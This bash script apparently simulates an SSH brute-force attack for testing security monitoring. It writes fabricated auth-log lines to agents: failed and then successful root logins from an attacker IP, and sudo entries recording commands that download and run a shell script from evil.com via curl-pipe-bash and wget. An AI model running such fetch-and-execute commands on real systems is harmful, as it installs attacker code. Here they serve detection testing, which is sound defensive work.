#!/bin/bash
SCRIPT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
source "$SCRIPT_DIR/orchestrator.conf"
source "$SCRIPT_DIR/inject-common.sh"

ATTACKER_IP="10.0.0.99"
COUNT=$(get_attack_lines)
PORT=$((RANDOM % 50000 + 10000))
USERS=("root" "admin" "ubuntu" "www-data" "deploy")
AGENTS_LIST=("$AGENTS_SHARED" "$AGENTS_MULTI")

for agent in "${AGENTS_LIST[@]}"; do
    PORT=$((PORT + 1000))

    for ((i=0; i<COUNT/2; i++)); do
        user="${USERS[$((RANDOM % ${#USERS[@]}))]}"
        inject_auth "$agent" "sshd[$((PORT + i))]: Failed password for invalid user ${user} from ${ATTACKER_IP} port $((PORT + i)) ssh2"
    done

    for ((i=0; i<COUNT/3; i++)); do
        inject_auth "$agent" "sshd[$((PORT + i + 100))]: Failed password for root from ${ATTACKER_IP} port $((PORT + i + 100)) ssh2"
    done

    inject_auth "$agent" "sshd[$((PORT + 999))]: Accepted password for root from ${ATTACKER_IP} port $((PORT + 999)) ssh2"

    inject_auth "$agent" "sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c 'curl http://evil.com/shell.sh | bash'"
    inject_auth "$agent" "sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget -O /tmp/shell http://evil.com/shell.sh"
    inject_auth "$agent" "sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod +x /tmp/shell"
    inject_auth "$agent" "sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/tmp/shell"
done

log_orch "scenario=ssh-brute lines=$((COUNT * 2)) attacker=${ATTACKER_IP}"
